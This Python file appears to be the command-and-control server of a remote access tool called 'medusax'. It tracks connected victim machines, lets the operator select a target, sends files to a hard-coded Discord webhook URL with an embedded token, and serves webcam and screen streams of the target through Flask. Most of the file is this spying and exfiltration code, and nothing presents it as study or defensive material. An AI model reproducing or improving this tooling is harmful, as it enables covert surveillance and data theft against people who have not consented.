import socket
import threading
import time
import requests
from flask import Flask, render_template

# Flask app for streaming webcam/screen
app = Flask(__name__)

clients = {}  # Store client IPs and status
target_ip = None
streaming_active = False

# Start Flask Web Server for Webcam/Screen Streaming
@app.route('/webcam')
def webcam_stream():
    global target_ip
    if target_ip:
        return render_template('webcam.html', target_ip=target_ip, start_time=time.ctime(), status="Playing")
    return "No target selected", 404

@app.route('/screen')
def screen_stream():
    global target_ip
    if target_ip:
        return render_template('screen.html', target_ip=target_ip, start_time=time.ctime(), status="Playing")
    return "No target selected", 404

def start_flask():
    app.run(host="0.0.0.0", port=5000)

# Handle communication with the client
def client_handler(client_socket, client_ip):
    global target_ip, streaming_active
    print(f"[+] New client connected: {client_ip}")
    clients[client_ip] = "Idle"
    
    while True:
        command = client_socket.recv(1024).decode()
        if not command:
            break

        if command == "!list":
            print("[*] Connected Clients:")
            for ip in clients:
                print(f"Target IP: {ip}")
        
        elif command.startswith("!set target"):
            target_ip = command.split()[2]
            print(f"[+] Target set to: {target_ip}")
        
        elif command.startswith("!remove target"):
            ip_to_remove = command.split()[2]
            if ip_to_remove == target_ip:
                target_ip = None
            print(f"[+] Removed target: {ip_to_remove}")
        
        elif command.startswith("!download"):
            file_name = command.split()[1]
            print(f"[+] Sending file {file_name} to Discord...")
            # Send file to Discord Webhook (you'll need to implement the actual webhook functionality)
            requests.post("https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2", files={"file": open(file_name, "rb")})
            print("[+] File sent!")
        
        elif command == "!webcam_stream":
            if target_ip and not streaming_active:
                print("[+] Starting Webcam Stream...")
                threading.Thread(target=start_flask).start()
                streaming_active = True
            else:
                print("[*] Cannot start streaming. Either no target set or streaming is already active.")

        elif command == "!screen_stream":
            if target_ip and not streaming_active:
                print("[+] Starting Screen Stream...")
                threading.Thread(target=start_flask).start()
                streaming_active = True
            else:
                print("[*] Cannot start streaming. Either no target set or streaming is already active.")

        # If command not recognized
        else:
            print(f"[*] Command not recognized: {command}")
    
    client_socket.close()

# Server main
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("[+] Server started on port 9999")

    while True:
        client_socket, client_address = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket, client_address[0]))
        client_thread.start()

        # Show the prompt after one client is connected
        if len(clients) == 1:
            print("medusax > ", end="")

if __name__ == "__main__":
    start_server()
